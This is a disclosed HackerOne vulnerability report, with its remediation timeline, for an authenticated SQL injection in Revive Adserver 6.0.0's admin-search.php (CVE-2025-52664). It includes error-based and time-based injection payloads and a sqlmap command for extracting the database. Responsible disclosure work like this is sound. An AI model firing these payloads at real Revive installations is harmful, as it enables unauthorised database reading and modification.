---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/sql-injection
  - env/web
  - stack/php
  - vuln/sql-injection
  - vuln/misconfiguration
  - impact/unauthorized-write
  - trigger/auth-required
  - fix/parameterized-query
  - fix/input-validation
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2025-10-24
submitted: 2025-10-22T21:18:20.218Z
bounty_usd: null
votes: 93
cve: "CVE-2025-52664"
program: "[[programs/revive_adserver|Revive Adserver]]"
reporter: "kanon4"
source: "https://hackerone.com/reports/3395221"
title: "Error-Based & Time-Based SQL Injection in 'keyword' Parameter of admin-search.php Allowing Full Database Access in Revive Adserver v6.0.0"
---
# Error-Based & Time-Based SQL Injection in 'keyword' Parameter of admin-search.php Allowing Full Database Access in Revive Adserver v6.0.0

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 93 | **Program:** Revive Adserver | **Disclosed:** 2025-10-24

- Report: [https://hackerone.com/reports/3395221](https://hackerone.com/reports/3395221)
- CWE: SQL Injection | CVE: CVE-2025-52664
- Submitted: 2025-10-22T21:18:20.218Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

==Cricetinae==

#Summary:

A critical SQL Injection vulnerability has been identified in Revive Adserver's administrative search functionality, specifically in the `admin-search.php` file. The vulnerability exists in the handling of the keyword `GET` parameter, which is passed to multiple database queries without proper sanitization or parameterization.


The vulnerability stems from the use of the phpAds_registerGlobalUnslashed() function to register user input variables, including keyword, without proper escaping:

```php
phpAds_registerGlobalUnslashed('keyword', 'client', 'campaign', 'banner', 'zone', 'affiliate', 'compact');
```

Subsequently, this user-controlled input is passed directly to several database query functions:

```php
$rsClients = $dalClients->getClientByKeyword($keyword, $agencyId);
$rsCampaigns = $dalCampaigns->getCampaignAndClientByKeyword($keyword, $agencyId);
$rsBanners = $dalBanners->getBannerByKeyword($keyword, $agencyId);
$rsAffiliates = $dalAffiliates->getAffiliateByKeyword($keyword, $agencyId);
$rsZones = $dalZones->getZoneByKeyword($keyword, $agencyId);
```

Without examining the implementation of these functions, it's evident they do not properly sanitize the `keyword` parameter before incorporating it into SQL queries, resulting in SQL Injection.

**Technical Analysis**

Testing with SQLMap confirmed two distinct SQL Injection vulnerabilities:

1.Error-based injection using MySQL's EXTRACTVALUE function:

```bash
Payload: keyword=FUZZ') AND EXTRACTVALUE(8429,CONCAT(0x5c,0x716a7a6a71,(SELECT (ELT(8429=8429,1))),0x7178787871))-- Nqvq&compact=t
```

2. Time-based blind injection using MySQL's SLEEP function:

```bash
Payload: keyword=FUZZ') AND (SELECT 3790 FROM (SELECT(SLEEP(5)))yGYJ)-- YFDA&compact=t
```

#Steps To Reproduce:

  1. open `burp suite` And open the built-in browser with it
  1. Go to the following request: `http://localhost/www/admin/admin-search.php?keyword=FUZZ&compact=t`
  1. Capture the request using Burp Suite
  1. Save the request to a text file using `nano testsql.txt`
  1. Run the following command:

```bash
sqlmap -r testsql.txt --dbs
```

  6. ==You will see the database being extracted==

#Supporting Material/References:

**PoC Video**

{F4922045}

https://portswigger.net/web-security/sql-injection
https://owasp.org/www-community/attacks/SQL_Injection
https://www.imperva.com/learn/application-security/sql-injection-sqli/
https://www.cloudflare.com/learning/security/threats/sql-injection/
https://www.acunetix.com/websitesecurity/sql-injection/

## Impact

This vulnerability allows an authenticated attacker to:

- Extract sensitive information from the database
- Modify or delete database contents
- Potentially execute privileged commands on the database server
- Possibly escalate to a more severe attack vector through data exfiltration

The SQLMap test successfully identified the database name and confirmed the ability to execute arbitrary SQL queries through the vulnerable parameter.
Root Cause

The root cause is improper input validation and the absence of prepared statements or parameterized queries. The application directly incorporates user-controlled input into SQL queries without adequate sanitization or escaping mechanisms.

This is a fundamental code flaw in the Revive Adserver source code and not a result of misconfiguration.

## Timeline

- **Report Filed**
- **Report Triaged**
- **Report Severity Updated**
- **Cve Id Added**
- **2025-10-23** @kanon4: Hi @mbeccati,

Thank you very much for your prompt response and confirmation of the vulnerability. I appreciate the detailed explanation about the root cause being in the unmaintained PEAR MDB2 package's `matchPattern` functionality.

Thank you very much for your prompt response and confirmation of the vulnerability. I appreciate the detailed explanation about the root cause being in the unmaintained PEAR MDB2 package's matchPattern functionality.

For attribution in the security advisory, I would like to be credited as:

**Mahmoud Khaled Kanon**

GitHub: https://github.com/Kanon4

I'm pleased to have contributed to improving the security of Revive Adserver. Finding vulnerabilities in widely-used open source software is important to me as it helps protect the broader internet ecosystem and the many businesses that rely on these platforms.

Will the CVE-2025-52664 be published on the NIST National Vulnerability Database (`nvd.nist.gov`) as well? I'm interested in tracking its official publication.


Thank you again for the swift and professional handling of this report. I look forward to the release of version 6.0.1 with the security fix.

Best regards,
@kanon4
- **2025-10-23** @mbeccati: Apologies, the previous fix was preventing the vulnerability, but it was generating a broken query. The attached file is now fully tested and working: {F4923816}
- **2025-10-23** @mbeccati: Yes, we will publish a security advisory on the full-disclosure mailing list and request the publication of the CVE at the same time. It will take a few days for it to be picked up by the CVE databases.
- **2025-10-23** @kanon4: Hi @mbeccati,

Thank you for providing the updated patch. I've thoroughly tested the new implementation and can confirm that the SQL injection vulnerability is successfully mitigated while maintaining all search functionality.{F4924886}

The queries are working correctly with no errors, and the input sanitization is properly handling user inputs.

I appreciate your transparency about the initial fix and your detailed information regarding the CVE publication process.

Thank you for your professional handling of this security report.

Best regards,
@kanon4
- **Report Resolved**
- **2025-10-23** @kanon4: Hi @mbeccati,

Thank you for the update. I'm glad the fix has been confirmed and will be included in tomorrow's release. It was a pleasure working with you on this security issue.

Appreciate your professionalism throughout the process.

Best regards,
@kanon4
- **Agreed On Going Public**
- **Manually Disclosed**
